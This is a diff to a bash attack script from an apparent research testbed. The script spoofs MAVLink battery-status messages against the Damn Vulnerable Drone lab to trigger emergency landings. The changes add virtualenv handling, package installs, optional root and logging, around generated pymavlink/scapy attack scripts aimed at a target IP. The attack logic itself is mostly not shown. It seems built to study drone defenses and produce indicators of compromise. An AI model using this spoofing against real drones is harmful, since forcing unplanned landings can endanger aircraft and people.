@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # =============================================================================
-# DVD Protocol Tampering Module: Battery Status Spoofing Attack
+# DVD Protocol Tampering Module: Battery Status Spoofing Attack (FIXED)
 # =============================================================================
-# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/battery_spoofing.sh
-# 목적: 배터리 상태 스푸핑을 통한 긴급 착륙 유도 공격
+# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/battery_spoofing_fixed.sh
+# 목적: 배터리 상태 스푸핑을 통한 긴급 착륙 유도 공격 (venv 호환)
 # 작성자: MTD Testbed Team
 # =============================================================================
 
@@ -21,6 +21,17 @@ LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/battery
 IOC_FILE="/tmp/battery_spoofing_iocs.txt"
 JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/battery_spoofing_report_$(date +%Y%m%d_%H%M%S).json"
 PYTHON_SCRIPT="/tmp/battery_spoofing_attack.py"
+
+# Python 경로 설정 (venv 지원)
+if [ -n "$VIRTUAL_ENV" ]; then
+    PYTHON_CMD="$VIRTUAL_ENV/bin/python3"
+    PIP_CMD="$VIRTUAL_ENV/bin/pip3"
+    echo -e "${GREEN}[✓] Virtual environment detected: $VIRTUAL_ENV${NC}"
+else
+    PYTHON_CMD="python3"
+    PIP_CMD="pip3"
+    echo -e "${YELLOW}[!] No virtual environment detected, using system Python${NC}"
+fi
 
 # 배터리 스푸핑 시나리오
 declare -A BATTERY_SCENARIOS=(
@@ -43,6 +54,7 @@ print_header() {
     echo -e "${BLUE}Target: Battery Management System${NC}"
     echo -e "${BLUE}Method: False Battery Status Injection${NC}"
     echo -e "${BLUE}Impact: Emergency Landing Procedures${NC}"
+    echo -e "${BLUE}Python: ${PYTHON_CMD}${NC}"
     echo ""
 }
 
@@ -285,8 +297,12 @@ if __name__ == "__main__":
     attack.execute_full_attack()
 EOF
     
+    # Python shebang을 현재 활성화된 Python으로 수정
+    sed -i "1s|#!/usr/bin/env python3|#!${PYTHON_CMD}|" "$PYTHON_SCRIPT"
     chmod +x "$PYTHON_SCRIPT"
+    
     echo -e "${GREEN}[✓] Battery spoofing script created: ${PYTHON_SCRIPT}${NC}" | tee -a "$LOG_FILE"
+    echo -e "${GREEN}[✓] Using Python: ${PYTHON_CMD}${NC}" | tee -a "$LOG_FILE"
     echo "BATTERY_SCRIPT:CREATED_${PYTHON_SCRIPT}" >> "$IOC_FILE"
 }
 
@@ -319,23 +335,39 @@ detect_targets() {
     return 1
 }
 
-# 의존성 설치
+# 의존성 설치 (venv 지원)
 install_dependencies() {
     echo -e "${YELLOW}[+] Installing required dependencies...${NC}" | tee -a "$LOG_FILE"
     
-    # 패키지 업데이트
-    apt-get update -qq
-    apt-get install -y python3 python3-pip 2>&1 | tee -a "$LOG_FILE"
+    # 패키지 업데이트 (root 권한이 있을 때만)
+    if [[ $EUID -eq 0 ]]; then
+        apt-get update -qq
+        apt-get install -y python3 python3-pip netcat-traditional 2>&1 | tee -a "$LOG_FILE"
+    fi
     
-    # Python 라이브러리 설치
-    pip3 install pymavlink scapy 2>&1 | tee -a "$LOG_FILE"
+    # Virtual environment 내에서 설치
+    if [ -n "$VIRTUAL_ENV" ]; then
+        echo -e "${CYAN}[*] Installing packages in virtual environment: $VIRTUAL_ENV${NC}" | tee -a "$LOG_FILE"
+        
+        # 권한 문제를 피하기 위해 --user 플래그 제거
+        "$PIP_CMD" install pymavlink scapy 2>&1 | tee -a "$LOG_FILE"
+    else
+        echo -e "${CYAN}[*] Installing packages in system Python${NC}" | tee -a "$LOG_FILE"
+        
+        # System Python에서는 --break-system-packages 사용
+        "$PIP_CMD" install pymavlink scapy --break-system-packages 2>&1 | tee -a "$LOG_FILE"
+    fi
     
-    if [ $? -eq 0 ]; then
+    # 설치 확인
+    if "$PYTHON_CMD" -c "import pymavlink, scapy; print('Dependencies OK')" 2>/dev/null; then
         echo -e "${GREEN}[✓] Dependencies installed successfully${NC}" | tee -a "$LOG_FILE"
         echo "BATTERY_DEPS:INSTALLED" >> "$IOC_FILE"
         return 0
     else
         echo -e "${RED}[!] Failed to install dependencies${NC}" | tee -a "$LOG_FILE"
+        echo -e "${YELLOW}[*] Checking what's missing...${NC}"
+        "$PYTHON_CMD" -c "import pymavlink; print('pymavlink OK')" 2>/dev/null || echo "pymavlink MISSING"
+        "$PYTHON_CMD" -c "import scapy; print('scapy OK')" 2>/dev/null || echo "scapy MISSING"
         return 1
     fi
 }
@@ -351,9 +383,10 @@ execute_battery_spoofing() {
     echo -e "${CYAN}[*] Starting battery status spoofing...${NC}" | tee -a "$LOG_FILE"
     echo -e "${YELLOW}[*] Target: ${TARGET_IP}:${TARGET_PORT}${NC}" | tee -a "$LOG_FILE"
     echo -e "${YELLOW}[*] Duration: ${total_duration} seconds${NC}" | tee -a "$LOG_FILE"
+    echo -e "${YELLOW}[*] Python: ${PYTHON_CMD}${NC}" | tee -a "$LOG_FILE"
     
-    # Python 스크립트를 백그라운드에서 실행
-    timeout "$total_duration" python3 "$PYTHON_SCRIPT" "$TARGET_IP" "$TARGET_PORT" &
+    # Python 스크립트를 백그라운드에서 실행 (venv Python 사용)
+    timeout "$total_duration" "$PYTHON_CMD" "$PYTHON_SCRIPT" "$TARGET_IP" "$TARGET_PORT" &
     local attack_pid=$!
     
     echo "BATTERY_ATTACK:STARTED_PID_${attack_pid}_$(date +%s)" >> "$IOC_FILE"
@@ -408,9 +441,9 @@ execute_scenario_attacks() {
         
         echo -e "${BLUE}[*] Spoofing: ${remaining}% battery, ${voltage}mV${NC}" | tee -a "$LOG_FILE"
         
-        # 시나리오별 스크립트 생성 (간단한 버전)
+        # 시나리오별 스크립트 생성 (간단한 버전, venv Python 사용)
         cat > "/tmp/battery_scenario_${scenario}.py" << EOF
-#!/usr/bin/env python3
+#!${PYTHON_CMD}
 from pymavlink import mavutil
 from scapy.all import *
 import time
@@ -448,8 +481,9 @@ for i in range(20):
 print(f"[+] ${scenario} scenario completed")
 EOF
         
-        # 시나리오 실행
-        timeout 15 python3 "/tmp/battery_scenario_${scenario}.py" "$TARGET_IP" "$TARGET_PORT" &
+        # 시나리오 실행 (venv Python 사용)
+        chmod +x "/tmp/battery_scenario_${scenario}.py"
+        timeout 15 "$PYTHON_CMD" "/tmp/battery_scenario_${scenario}.py" "$TARGET_IP" "$TARGET_PORT" &
         local scenario_pid=$!
         
         # 진행률 표시
@@ -507,7 +541,12 @@ generate_json_report() {
         "type": "$ATTACK_TYPE",
         "timestamp": "$(date -Iseconds)",
         "duration": $((end_time - start_time)),
-        "status": "completed"
+        "status": "completed",
+        "python_environment": {
+            "python_cmd": "$PYTHON_CMD",
+            "virtual_env": "${VIRTUAL_ENV:-null}",
+            "pip_cmd": "$PIP_CMD"
+        }
     },
     "target_details": {
         "target_ip": "$TARGET_IP",
@@ -551,14 +590,15 @@ EOF
 main() {
     print_header
     
-    # Root 권한 체크
+    # Root 권한 체크 (선택적)
     if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}[!] This attack requires root privileges${NC}"
-        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
-        exit 1
+        echo -e "${YELLOW}[!] This script works better with root privileges for packet injection${NC}"
+        echo -e "${YELLOW}[*] Continuing with current user permissions...${NC}"
     fi
     
     # 로그 초기화
+    mkdir -p "$(dirname "$LOG_FILE")"
+    mkdir -p "$(dirname "$JSON_OUTPUT")"
     echo "=== DVD Battery Spoofing Attack Started at $(date) ===" > "$LOG_FILE"
     echo "" > "$IOC_FILE"
     
@@ -601,6 +641,7 @@ main() {
     echo "   • Attack Method: MAVLink Battery Status Spoofing"
     echo "   • Scenarios Executed: ${#BATTERY_SCENARIOS[@]}"
     echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
+    echo "   • Python Environment: ${VIRTUAL_ENV:-System Python}"
     echo ""
     echo -e "${BLUE}📁 Output Files:${NC}"
     echo "   • Log: ${LOG_FILE}"
